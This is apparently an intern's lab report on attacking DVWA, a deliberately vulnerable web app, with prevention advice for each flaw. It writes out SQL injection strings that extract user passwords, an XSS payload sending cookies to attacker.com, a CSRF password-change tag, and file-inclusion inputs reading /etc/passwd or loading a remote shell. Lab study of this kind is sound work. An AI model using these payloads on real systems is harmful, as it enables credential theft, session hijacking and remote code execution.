# 🌐 Task 3: Web Application Security

> **Intern:** Diwakar Chandra | **ID:** APSPL2632803  
> **Timeline:** Days 25–36 | **Program:** ApexPlanet Cybersecurity Internship

---

## 🎯 Objective
Identify and exploit OWASP Top 10 vulnerabilities in DVWA (Damn Vulnerable Web App).

---

## 🔴 1. SQL Injection (SQLi)

```sql
-- Basic test
Input: 1' OR '1'='1
Result: Returns ALL users!

-- Extract database version
Input: 1' UNION SELECT null, version()--

-- Extract usernames & passwords
Input: 1' UNION SELECT user, password FROM users--
```

**Prevention:**
```php
// Use Prepared Statements ALWAYS
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$id]);
```

---

## 🟠 2. Cross-Site Scripting (XSS)

```html
<!-- Stored XSS -->
<script>alert('XSS by Diwakar')</script>

<!-- Cookie Stealing -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- Reflected XSS via URL -->
http://target.com/search?q=<script>alert('XSS')</script>
```

**Prevention:**
```php
// Always encode output
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```
```
// Content Security Policy header
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 🟠 3. Cross-Site Request Forgery (CSRF)

```html
<!-- Malicious page that changes victim's password -->
<img src='http://target.com/change_password?new=hacked&confirm=hacked'>
```

**Prevention:**
```php
// CSRF Token
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;
// Validate: if($_POST['csrf_token'] !== $_SESSION['csrf_token']) die('CSRF!');
```

---

## 🟠 4. File Inclusion Attacks

```
# Local File Inclusion (LFI)
?page=../../../../etc/passwd

# Remote File Inclusion (RFI)  
?page=http://attacker.com/shell.php
```

**Prevention:**
- Disable `allow_url_include` in php.ini
- Use whitelist for allowed filenames only

---

## 🔵 5. Burp Suite Usage

```
Setup: Browser proxy → 127.0.0.1:8080 → Burp Suite

Tools used:
- Proxy    → Intercept & modify HTTP requests
- Repeater → Resend modified requests
- Intruder → Automated fuzzing/brute force
- Scanner  → Automated vulnerability detection
```

---

## 🔵 6. Security Headers

```apache
# Add to Apache .htaccess
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000"
Header always set Content-Security-Policy "default-src 'self'"
```

---

## 📊 Findings Summary

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| SQL Injection | 🔴 Critical | Full DB access |
| Remote File Inclusion | 🔴 Critical | Remote code execution |
| Stored XSS | 🟠 High | Session hijacking |
| CSRF | 🟠 High | Unauthorized actions |
| Local File Inclusion | 🟠 High | File disclosure |
| Missing Headers | 🟡 Medium | XSS exposure |

---

## 🔑 Key Takeaways

1. **Never trust user input** — always validate and sanitize
2. **Parameterized queries** are the only defense against SQLi
3. **CSRF tokens** must be on every state-changing form
4. **Security headers** are free and block entire attack categories
5. **Burp Suite** reveals everything flowing between browser and server

---

## 📌 Deliverables

| Deliverable | Status |
|-------------|--------|
| Security Testing Report PDF | ✅ Completed |
| GitHub Repository | ✅ Completed |
| 8-min Video Demo | ✅ Completed |

---

*ApexPlanet Cybersecurity Internship | www.apexplanet.in*
